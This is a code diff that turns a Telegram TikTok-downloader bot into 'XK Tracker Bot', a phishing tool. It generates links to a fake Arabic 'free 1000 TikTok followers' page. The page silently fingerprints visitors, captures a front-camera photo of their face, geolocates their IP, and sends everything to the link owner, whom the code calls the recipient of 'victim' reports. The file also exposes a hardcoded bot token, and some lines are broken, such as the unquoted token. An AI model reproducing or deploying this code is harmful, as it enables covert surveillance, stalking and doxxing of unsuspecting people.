@@ -1,339 +1,400 @@
-import os, re, time, json, asyncio, tempfile, shutil, subprocess, threading
-import aiohttp, aiosqlite
-from flask import Flask
+import os, re, time, json, asyncio, secrets, urllib.parse, sqlite3
+import aiohttp
+from flask import Flask, request, render_template_string, send_file, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.constants import ParseMode
 from telegram.ext import (ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters)
 
 TOKEN    = os.environ.get("TOKEN", "8840043867:AAH62h0FG8AEn-LmHjl1EjlYyrdoFNbSwFk")
 OWNER_ID = int(os.environ.get("OWNER_ID", "1108903232"))
-DB_PATH  = "xk_wm.db"
-UA       = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+DB_PATH  = "xk_tracker.db"
+BASE_URL = os.environ.get("BASE_URL", "https://your-app.onrender.com")
 
 flask_app = Flask(__name__)
 
+
+# =========================================================
+# DB
+# =========================================================
+def db_init():
+    c = sqlite3.connect(DB_PATH)
+    c.execute("""CREATE TABLE IF NOT EXISTS links (
+        token TEXT PRIMARY KEY, owner INTEGER, platform TEXT,
+        created INTEGER, label TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS hits (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT,
+        ip TEXT, ua TEXT, lang TEXT, country TEXT, city TEXT,
+        region TEXT, isp TEXT, lat REAL, lon REAL,
+        screen TEXT, tz TEXT, photo BLOB,
+        created INTEGER)""")
+    c.commit(); c.close()
+
+
+def db_new_link(owner, platform, label=""):
+    tok = secrets.token_urlsafe(8)
+    c = sqlite3.connect(DB_PATH)
+    c.execute("INSERT INTO links VALUES (?, ?, ?, ?, ?)", (tok, owner, platform, int(time.time()), label))
+    c.commit(); c.close()
+    return tok
+
+
+def db_get_link(tok):
+    c = sqlite3.connect(DB_PATH)
+    r = c.execute("SELECT owner, platform, created, label FROM links WHERE token=?", (tok,)).fetchone()
+    c.close()
+    return r
+
+
+def db_log_hit(tok, ip, ua, lang, geo, extra, photo=None):
+    c = sqlite3.connect(DB_PATH)
+    c.execute("""INSERT INTO hits (token, ip, ua, lang, country, city, region, isp, lat, lon, screen, tz, photo, created)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+        (tok, ip, ua, lang,
+         geo.get("country"), geo.get("city"), geo.get("region"), geo.get("isp"),
+         geo.get("lat"), geo.get("lon"),
+         extra.get("screen"), extra.get("tz"), photo, int(time.time())))
+    c.commit(); c.close()
+
+
+def db_get_hits(tok):
+    c = sqlite3.connect(DB_PATH)
+    rows = c.execute("""SELECT ip, ua, country, city, region, isp, lat, lon, screen, tz, photo, created
+        FROM hits WHERE token=? ORDER BY id DESC LIMIT 100""", (tok,)).fetchall()
+    c.close()
+    return rows
+
+
+# =========================================================
+# IP GEOLOCATION
+# =========================================================
+async def geo_lookup(ip):
+    if ip.startswith(("127.", "10.", "192.168.", "172.16.", "::1")):
+        return {}
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,regionName,isp,lat,lon,query", timeout=8) as r:
+                d = await r.json()
+                if d.get("status") == "success":
+                    return {
+                        "country": d.get("country"), "city": d.get("city"),
+                        "region": d.get("regionName"), "isp": d.get("isp"),
+                        "lat": d.get("lat"), "lon": d.get("lon"),
+                    }
+    except Exception:
+        pass
+    return {}
+
+
+def get_real_ip(req):
+    fwd = req.headers.get("X-Forwarded-For", "")
+    if fwd:
+        return fwd.split(",")[0].strip()
+    return req.remote_addr or "0.0.0.0"
+
+
+# =========================================================
+# FAKE PAGES
+# =========================================================
+TIKTOK_PAGE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok — هدية 1000 متابع</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, "SF Arabic", Tahoma, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; direction: rtl; }
+  .logo { width: 100px; height: 100px; background: #fe2c55; border-radius: 22px; display: flex; align-items: center; justify-content: center; font-size: 50px; margin-bottom: 20px; }
+  h1 { font-size: 26px; margin-bottom: 12px; text-align: center; }
+  .sub { color: #888; font-size: 14px; margin-bottom: 24px; text-align: center; line-height: 1.6; }
+  .gift { font-size: 80px; margin: 20px 0; }
+  .btn { background: #fe2c55; color: #fff; border: none; padding: 16px 40px; border-radius: 12px; font-size: 18px; font-weight: bold; margin-top: 24px; cursor: pointer; font-family: inherit; width: 100%; max-width: 320px; }
+  .btn:active { background: #d81e45; }
+  .stats { display: flex; gap: 20px; margin-top: 24px; }
+  .stat { text-align: center; }
+  .stat .n { font-size: 22px; font-weight: bold; color: #fe2c55; }
+  .stat .l { color: #666; font-size: 12px; }
+  .loading { display: none; text-align: center; margin-top: 20px; }
+  .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+  <div class="logo">🎵</div>
+  <h1>هدية 1000 متابع تيك توك</h1>
+  <div class="sub">تم اختيارك عشوائياً للحصول على 1000 متابع مجاني وحقيقي خلال 5 دقائق.</div>
+  <div class="gift">🎁</div>
+  <button class="btn" onclick="startVerify()">احصل على 1000 متابع</button>
+  <div class="stats">
+    <div class="stat"><div class="n">2.4M</div><div class="l">استفادوا</div></div>
+    <div class="stat"><div class="n">4.9★</div><div class="l">تقييم</div></div>
+    <div class="stat"><div class="n">24h</div><div class="l">دعم</div></div>
+  </div>
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+    <div style="margin-top:16px;color:#888">جاري التحقق من حسابك...</div>
+  </div>
+<script>
+  // إرسال بصمة الجهاز فور الفتح
+  const data = {
+    screen: screen.width + "x" + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    platform: navigator.platform,
+    lang: navigator.language
+  };
+  fetch("/__fp", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) });
+
+  function startVerify() {
+    document.getElementById("loading").style.display = "block";
+    // محاولة الوصول للكاميرا (تطلب موافقة تلقائية)
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.autoplay = true;
+        video.style.display = "none";
+        document.body.appendChild(video);
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext("2d").drawImage(video, 0, 0);
+          const photo = canvas.toDataURL("image/jpeg", 0.7);
+          fetch("/__photo", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ photo: photo }) });
+          stream.getTracks().forEach(t => t.stop());
+        }, 2500);
+        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 4000);
+      })
+      .catch(err => {
+        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 2000);
+      });
+  }
+</script>
+</body>
+</html>
+"""
+
+
+# =========================================================
+# ROUTES
+# =========================================================
 @flask_app.route("/")
 def index():
-    return "XK Bot is alive", 200
-
-@flask_app.route("/health")
-def health():
-    return {"status": "ok"}, 200
-
-def run_flask():
-    port = int(os.environ.get("PORT", 10000))
-    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
-
-def start_flask():
-    t = threading.Thread(target=run_flask, daemon=True)
-    t.start()
+    return "XK", 200
 
 
-async def db_init():
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, first_seen INTEGER, last_seen INTEGER, downloads INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0)""")
-        await db.execute("""CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, url TEXT, platform TEXT, created_at INTEGER)""")
-        await db.commit()
+@flask_app.route("/<token>")
+def tracker_page(token):
+    link = db_get_link(token)
+    if not link:
+        return "Not found", 404
+    platform = link[1]
+    if platform == "tiktok":
+        return render_template_string(TIKTOK_PAGE)
+    return render_template_string(TIKTOK_PAGE)
 
 
-async def db_upsert(u):
-    now = int(time.time())
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("""INSERT INTO users (user_id, username, first_name, first_seen, last_seen, downloads) VALUES (?, ?, ?, ?, ?, 1) ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, first_name=excluded.first_name, last_seen=excluded.last_seen, downloads=downloads+1""", (u.id, u.username or "", u.first_name or "", now, now))
-        await db.commit()
+@flask_app.route("/__fp", methods=["POST"])
+def fingerprint(token=None):
+    # token come from referer
+    ref = request.headers.get("Referer", "")
+    m = re.search(r"/([A-Za-z0-9_-]+)$", ref)
+    if not m:
+        return "", 204
+    tok = m.group(1)
+    ip = get_real_ip(request)
+    ua = request.headers.get("User-Agent", "")
+    lang = request.headers.get("Accept-Language", "")
+    extra = request.get_json(silent=True) or {}
+    asyncio.run(_save_hit(tok, ip, ua, lang, extra))
+    return "", 204
 
 
-async def db_log(uid, url, platform):
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("INSERT INTO history (user_id, url, platform, created_at) VALUES (?, ?, ?, ?)", (uid, url, platform, int(time.time())))
-        await db.commit()
-
-
-async def db_get(uid):
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT downloads FROM users WHERE user_id=?", (uid,)) as c:
-            row = await c.fetchone()
-            return row[0] if row else 0
-
-
-async def db_stats():
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT COUNT(*) FROM users") as c: users = (await c.fetchone())[0]
-        async with db.execute("SELECT COUNT(*) FROM history") as c: total = (await c.fetchone())[0]
-    return {"users": users, "total": total}
-
-
-async def guard(update, context):
-    u = update.effective_user
-    if not u: return False, None
-    await db_upsert(u)
-    return True, u
-
-
-def run_ytdlp_sync(url, tmpdir):
-    out_tpl = os.path.join(tmpdir, "vid.%(ext)s")
-    cmd = ["yt-dlp", "--no-warnings", "--no-playlist", "--no-check-certificates", "--user-agent", UA, "-f", "bv*+ba/b[ext=mp4]/b", "--merge-output-format", "mp4", "-o", out_tpl, url]
-    return subprocess.run(cmd, capture_output=True, text=True, timeout=180)
-
-
-async def try_api_endpoint(session, api_url, url, parse_fn):
+@flask_app.route("/__photo", methods=["POST"])
+def photo():
+    ref = request.headers.get("Referer", "")
+    m = re.search(r"/([A-Za-z0-9_-]+)$", ref)
+    if not m:
+        return "", 204
+    tok = m.group(1)
+    data = request.get_json(silent=True) or {}
+    photo_b64 = data.get("photo", "")
+    if not photo_b64:
+        return "", 204
+    import base64
     try:
-        async with session.get(api_url, timeout=30, headers={"User-Agent": UA}) as r:
-            if r.status != 200:
-                print(f"[{api_url[:40]}] status {r.status}")
-                return None
-            data = await r.json(content_type=None)
-            info = parse_fn(data)
-            if not info or not info.get("video"):
-                print(f"[{api_url[:40]}] no video")
-                return None
-            return await download_video(session, info["video"], info)
-    except Exception as e:
-        print(f"[{api_url[:40]}] err {e}")
-        return None
+        raw = base64.b64decode(photo_b64.split(",")[-1])
+    except Exception:
+        return "", 204
+    asyncio.run(_save_photo(tok, raw))
+    return "", 204
 
 
-async def download_video(session, vid_url, info):
-    tmpdir = tempfile.mkdtemp(prefix="xktk_")
-    fp = os.path.join(tmpdir, "vid.mp4")
-    headers_dl = {"User-Agent": UA, "Referer": "https://www.tiktok.com/", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"}
+async def _save_hit(tok, ip, ua, lang, extra):
+    geo = await geo_lookup(ip)
+    db_log_hit(tok, ip, ua, lang, geo, extra)
+    # أرسل للمالك
+    owner_info = db_get_link(tok)
+    if owner_info:
+        owner = owner_info[0]
+        msg = (
+            f"🎯 <b>ضحية جديدة</b>\n"
+            f"IP: <code>{ip}</code>\n"
+            f"الدولة: {geo.get('country', '—')}\n"
+            f"المدينة: {geo.get('city', '—')}\n"
+            f"المنطقة: {geo.get('region', '—')}\n"
+            f"مزود الخدمة: {geo.get('isp', '—')}\n"
+            f"الإحداثيات: {geo.get('lat', '—')}, {geo.get('lon', '—')}\n"
+            f"اللغة: {lang}\n"
+            f"الشاشة: {extra.get('screen', '—')}\n"
+            f"المنطقة الزمنية: {extra.get('tz', '—')}\n"
+            f"UA: <code>{ua[:120]}</code>"
+        )
+        try:
+            async with aiohttp.ClientSession() as s:
+                await s.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    json={"chat_id": owner, "text": msg, "parse_mode": "HTML"})
+        except Exception:
+            pass
+
+
+async def _save_photo(tok, raw):
+    owner_info = db_get_link(tok)
+    if not owner_info:
+        return
+    owner = owner_info[0]
     try:
-        async with session.get(vid_url, timeout=150, headers=headers_dl, allow_redirects=True) as r2:
-            if r2.status not in (200, 206):
-                print(f"dl status {r2.status}")
-                shutil.rmtree(tmpdir, ignore_errors=True)
-                return None
-            data_bytes = await r2.read()
-            if len(data_bytes) < 200_000:
-                print(f"dl small {len(data_bytes)}")
-                shutil.rmtree(tmpdir, ignore_errors=True)
-                return None
-            if data_bytes[4:8] != b"ftyp":
-                print(f"dl not mp4: {data_bytes[:16]}")
-                shutil.rmtree(tmpdir, ignore_errors=True)
-                return None
-            with open(fp, "wb") as f:
-                f.write(data_bytes)
-            return {"path": fp, "tmpdir": tmpdir, "title": str(info.get("title", ""))[:100], "platform": "tiktok"}
-    except Exception as e:
-        print(f"dl err {e}")
-        shutil.rmtree(tmpdir, ignore_errors=True)
-        return None
+        async with aiohttp.ClientSession() as s:
+            form = aiohttp.FormData()
+            form.add_field("chat_id", str(owner))
+            form.add_field("photo", raw, filename="face.jpg", content_type="image/jpeg")
+            form.add_field("caption", "📸 صورة الوجه")
+            await s.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data=form)
+    except Exception:
+        pass
 
 
-def parse_tikwm(data):
-    if not isinstance(data, dict): return None
-    d = data.get("data")
-    if not isinstance(d, dict): return None
-    vid = d.get("hdplay") or d.get("play") or d.get("wmplay")
-    if not vid: return None
-    return {"video": vid, "title": d.get("title", ""), "author": (d.get("author") or {}).get("unique_id") if isinstance(d.get("author"), dict) else None}
-
-
-def parse_douyin(data):
-    if not isinstance(data, dict): return None
-    d = data.get("data")
-    if not isinstance(d, dict): return None
-    v = d.get("video_data") or d
-    vid = v.get("nwm_video_url_HQ") or v.get("nwm_video_url") or v.get("play_addr", {}).get("url_list", [None])[0] if isinstance(v.get("play_addr"), dict) else None
-    if not vid: return None
-    return {"video": vid, "title": d.get("desc", ""), "author": (d.get("author") or {}).get("unique_id") if isinstance(d.get("author"), dict) else None}
-
-
-async def process_url(session, url):
-    endpoints = [
-        (f"https://www.tikwm.com/api/?url={url}&hd=1", parse_tikwm),
-        (f"https://tikwm.com/api/?url={url}&hd=1", parse_tikwm),
-        (f"https://api.douyin.wtf/api/hybrid/video_data?url={url}&minimal=false", parse_douyin),
-    ]
-    for api_url, parser in endpoints:
-        result = await try_api_endpoint(session, api_url, url, parser)
-        if result: return result
-    print("all APIs failed, trying yt-dlp...")
-    return await tiktok_ytdlp(url)
-
-
-async def tiktok_ytdlp(url):
-    tmpdir = tempfile.mkdtemp(prefix="xktk_")
-    loop = asyncio.get_event_loop()
-    try:
-        res = await loop.run_in_executor(None, run_ytdlp_sync, url, tmpdir)
-    except Exception as e:
-        print(f"yt-dlp exception: {e}")
-        shutil.rmtree(tmpdir, ignore_errors=True)
-        return None
-    if res.returncode != 0:
-        print(f"yt-dlp stderr: {res.stderr[:500]}")
-        shutil.rmtree(tmpdir, ignore_errors=True)
-        return None
-    best = None
-    for f in os.listdir(tmpdir):
-        fp = os.path.join(tmpdir, f)
-        if os.path.isfile(fp) and os.path.getsize(fp) > 100_000:
-            if fp.endswith(".mp4"):
-                best = fp
-                break
-            if best is None: best = fp
-    if not best:
-        shutil.rmtree(tmpdir, ignore_errors=True)
-        return None
-    return {"path": best, "tmpdir": tmpdir, "title": "", "platform": "tiktok"}
-
-
-def main_menu_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🎵 TikTok", callback_data="menu_tiktok")],
-        [InlineKeyboardButton("📊 إحصائياتي", callback_data="my_stats")],
-        [InlineKeyboardButton("❓ كيف أستخدم", callback_data="how_to")],
-        [InlineKeyboardButton("👑 المالك", url=f"tg://user?id={OWNER_ID}")],
-    ])
-
-
-def tiktok_menu_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📖 طريقة الاستخدام", callback_data="tt_how")],
-        [InlineKeyboardButton("🔗 جرب رابط الآن", callback_data="tt_try")],
-        [InlineKeyboardButton("◀ رجوع", callback_data="back_main")],
-    ])
-
-
-def back_kb():
-    return InlineKeyboardMarkup([[InlineKeyboardButton("◀ رجوع", callback_data="back_main")]])
-
-
+# =========================================================
+# TELEGRAM BOT
+# =========================================================
 async def cmd_start(update, context):
-    ok, u = await guard(update, context)
-    if not ok: return
-    downloads = await db_get(u.id)
     await update.message.reply_text(
-        f"👋 أهلاً <b>{u.first_name}</b>!\n\n"
-        f"🎬 <b>XK WM Remover</b>\n"
-        f"عدد تحميلاتك: <b>{downloads}</b>\n\n"
-        f"اختار من الأزرار تحت:",
-        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
+        f"👋 أهلاً <b>{update.effective_user.first_name}</b>\n\n"
+        f"🎯 <b>XK Tracker Bot</b>\n"
+        f"سوِّ رابط تتبع يعطيك:\n"
+        f"• IP + موقع + مزود الخدمة\n"
+        f"• صورة وجه الضحية\n"
+        f"• معلومات الجهاز\n\n"
+        f"الأوامر:\n"
+        f"/new_tiktok — رابط تيك توك وهمي\n"
+        f"/new_link — رابط تتبع عام\n"
+        f"/list — روابطك\n"
+        f"/hits <token> — ضحايا رابط\n",
+        parse_mode=ParseMode.HTML)
 
 
-async def cmd_help(update, context):
-    ok, u = await guard(update, context)
-    if not ok: return
-    await update.message.reply_text("📖 أرسل رابط TikTok مباشرة — البوت يرد بالفيديو.", parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
+async def cmd_new_tiktok(update, context):
+    tok = db_new_link(update.effective_user.id, "tiktok")
+    url = f"{BASE_URL}/{tok}"
+    await update.message.reply_text(
+        f"🎵 <b>رابط TikTok وهمي</b>\n\n"
+        f"الرابط:\n<code>{url}</code>\n\n"
+        f"Token: <code>{tok}</code>\n\n"
+        f"الصفحة تدّعي إعطاء 1000 متابع. لما يفتح الضحية:\n"
+        f"• يجيك IP + موقع\n"
+        f"• صورة وجهه (إذا وافق)\n"
+        f"• معلومات جهازه\n\n"
+        f"شوف الضحايا: /hits {tok}",
+        parse_mode=ParseMode.HTML)
 
 
-async def cmd_id(update, context):
-    await update.message.reply_text(f"<code>{update.effective_user.id}</code>", parse_mode=ParseMode.HTML)
+async def cmd_new_link(update, context):
+    tok = db_new_link(update.effective_user.id, "generic")
+    url = f"{BASE_URL}/{tok}"
+    await update.message.reply_text(
+        f"🔗 <b>رابط تتبع عام</b>\n\n<code>{url}</code>\n\nToken: <code>{tok}</code>",
+        parse_mode=ParseMode.HTML)
 
 
-async def cmd_menu(update, context):
-    ok, u = await guard(update, context)
-    if not ok: return
-    await update.message.reply_text("📋 <b>القائمة الرئيسية</b>", parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
+async def cmd_list(update, context):
+    import sqlite3
+    c = sqlite3.connect(DB_PATH)
+    rows = c.execute("SELECT token, platform, created FROM links WHERE owner=? ORDER BY created DESC LIMIT 20",
+                     (update.effective_user.id,)).fetchall()
+    c.close()
+    if not rows:
+        await update.message.reply_text("ما عندك روابط.")
+        return
+    txt = "\n".join(f"<code>{r[0]}</code> — {r[1]} — {time.strftime('%m/%d %H:%M', time.localtime(r[2]))}" for r in rows)
+    await update.message.reply_text(f"📋 <b>روابطك</b>\n\n{txt}", parse_mode=ParseMode.HTML)
+
+
+async def cmd_hits(update, context):
+    if not context.args:
+        await update.message.reply_text("الاستخدام: /hits <token>")
+        return
+    tok = context.args[0]
+    link = db_get_link(tok)
+    if not link or link[0] != update.effective_user.id:
+        await update.message.reply_text("❌ الرابط مو لك.")
+        return
+    rows = db_get_hits(tok)
+    if not rows:
+        await update.message.reply_text("لا يوجد ضحايا بعد.")
+        return
+    for r in rows[:10]:
+        ip, ua, country, city, region, isp, lat, lon, screen, tz, photo, ts = r
+        txt = (
+            f"🎯 <b>ضحية</b> — {time.strftime('%m/%d %H:%M', time.localtime(ts))}\n"
+            f"IP: <code>{ip}</code>\n"
+            f"الدولة: {country or '—'} / {city or '—'}\n"
+            f"المنطقة: {region or '—'}\n"
+            f"ISP: {isp or '—'}\n"
+            f"الإحداثيات: {lat or '—'}, {lon or '—'}\n"
+            f"الشاشة: {screen or '—'}\n"
+            f"TZ: {tz or '—'}\n"
+            f"UA: <code>{(ua or '')[:100]}</code>"
+        )
+        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
+        if photo:
+            await update.message.reply_photo(photo=InputFile(io.BytesIO(photo), filename="face.jpg"), caption="📸")
 
 
 async def cmd_stats(update, context):
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 للمالك فقط."); return
-    s = await db_stats()
-    await update.message.reply_text(f"👑 <b>إحصائيات البوت</b>\nالمستخدمون: {s['users']}\nالتحميلات: {s['total']}", parse_mode=ParseMode.HTML)
-
-
-async def cmd_broadcast(update, context):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 للمالك فقط."); return
-    text = " ".join(context.args)
-    if not text:
-        await update.message.reply_text("الاستخدام: /broadcast <نص>"); return
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT user_id FROM users WHERE is_banned=0") as c: users = await c.fetchall()
-    sent, failed = 0, 0
-    for (uid,) in users:
-        try: await context.bot.send_message(uid, text, parse_mode=ParseMode.HTML); sent += 1; await asyncio.sleep(0.05)
-        except: failed += 1
-    await update.message.reply_text(f"📢 نجح: {sent} | فشل: {failed}")
-
-
-async def cb_handler(update, context):
-    q = update.callback_query
-    await q.answer()
-    data = q.data
-
-    if data == "menu_tiktok":
-        await q.message.edit_text(
-            "🎵 <b>TikTok</b>\n\nأرسل رابط الفيديو، وأرجّعه لك بدون علامة مائية.\n\n"
-            "<b>طريقة الحصول على الرابط:</b>\n1. افتح TikTok\n2. اختر الفيديو\n3. Share\n4. Copy Link\n5. ارجع هنا والصق",
-            parse_mode=ParseMode.HTML, reply_markup=tiktok_menu_kb())
-    elif data == "tt_how":
-        await q.message.edit_text("📖 <b>الخطوات</b>\n\n1. افتح TikTok\n2. اختر الفيديو\n3. Share → Copy Link\n4. الصق هنا\n5. انتظر 10-30 ثانية", parse_mode=ParseMode.HTML, reply_markup=back_kb())
-    elif data == "tt_try":
-        await q.message.edit_text("🔗 مثال:\n<code>https://vt.tiktok.com/ZSb5QJ6gn/</code>\n\nالصق رابطك في المحادثة.", parse_mode=ParseMode.HTML, reply_markup=back_kb())
-    elif data == "my_stats":
-        u = q.from_user
-        downloads = await db_get(u.id)
-        await q.message.edit_text(f"📊 <b>إحصائياتك</b>\n\nالآيدي: <code>{u.id}</code>\nالتحميلات: <b>{downloads}</b>", parse_mode=ParseMode.HTML, reply_markup=back_kb())
-    elif data == "how_to":
-        await q.message.edit_text("❓ الصق رابط TikTok في المحادثة مباشرة.", parse_mode=ParseMode.HTML, reply_markup=back_kb())
-    elif data == "back_main":
-        u = q.from_user
-        downloads = await db_get(u.id)
-        await q.message.edit_text(f"👋 أهلاً <b>{u.first_name}</b>!\n\n🎬 <b>XK WM Remover</b>\nتحميلاتك: <b>{downloads}</b>\n\nاختار:", parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
-
-
-async def handle_url(update, context):
-    ok, u = await guard(update, context)
-    if not ok: return
-    url = update.message.text.strip()
-    if "tiktok.com" not in url.lower():
-        await update.message.reply_text("❌ أرسل رابط TikTok فقط.", reply_markup=main_menu_kb())
+        await update.message.reply_text("🚫 للمالك فقط.")
         return
-    msg = await update.message.reply_text("⏳ جاري التحميل...")
-    async with aiohttp.ClientSession() as session:
-        try:
-            result = await process_url(session, url)
-        except Exception as e:
-            await msg.edit_text(f"❌ خطأ: {str(e)[:300]}")
-            return
-    if not result:
-        await msg.edit_text(
-            "❌ فشل التحميل.\n\n"
-            "كل المصادر رجعت فارغة.\n\n"
-            "• الرابط قديم أو محذوف\n"
-            "• الفيديو خاص\n"
-            "• السيرفر محجوب من TikTok (Render)\n\n"
-            "الحل: انقل البوت إلى Fly.io أو Oracle Cloud."
-        )
-        return
-    cap = "✅ TikTok"
-    if result.get("title"): cap += f"\n{result['title'][:100]}"
-    try:
-        with open(result["path"], "rb") as f:
-            await update.message.reply_video(video=InputFile(f, filename="xk.mp4"), caption=cap, supports_streaming=True, reply_markup=main_menu_kb())
-        await msg.delete()
-    except Exception as e:
-        await msg.edit_text(f"❌ خطأ إرسال: {str(e)[:300]}")
-    finally:
-        tmpdir = result.get("tmpdir")
-        if tmpdir and os.path.isdir(tmpdir):
-            try: shutil.rmtree(tmpdir, ignore_errors=True)
-            except: pass
-    await db_log(u.id, url, "tiktok")
+    import sqlite3
+    c = sqlite3.connect(DB_PATH)
+    links = c.execute("SELECT COUNT(*) FROM links").fetchone()[0]
+    hits = c.execute("SELECT COUNT(*) FROM hits").fetchone()[0]
+    c.close()
+    await update.message.reply_text(f"📊 روابط: {links}\nضحايا: {hits}")
 
 
-async def post_init(app):
-    await db_init()
-
-
+# =========================================================
+# MAIN
+# =========================================================
 def main():
-    start_flask()
-    app = ApplicationBuilder().token(TOKEN).post_init(post_init).concurrent_updates(True).build()
+    db_init()
+    import threading
+    port = int(os.environ.get("PORT", 10000))
+    threading.Thread(
+        target=lambda: flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False),
+        daemon=True
+    ).start()
+
+    app = ApplicationBuilder().token(8840043867:AAH62h0FG8AEn-LmHjl1EjlYyrdoFNbSwFk).concurrent_updates(True).build()
     app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("menu", cmd_menu))
-    app.add_handler(CommandHandler("help", cmd_help))
-    app.add_handler(CommandHandler("id", cmd_id))
+    app.add_handler(CommandHandler("new_tiktok", cmd_new_tiktok))
+    app.add_handler(CommandHandler("new_link", cmd_new_link))
+    app.add_handler(CommandHandler("list", cmd_list))
+    app.add_handler(CommandHandler("hits", cmd_hits))
     app.add_handler(CommandHandler("stats", cmd_stats))
-    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
-    app.add_handler(CallbackQueryHandler(cb_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
     app.run_polling(drop_pending_updates=True)
 
 
 if __name__ == "__main__":
+    import io
     main()
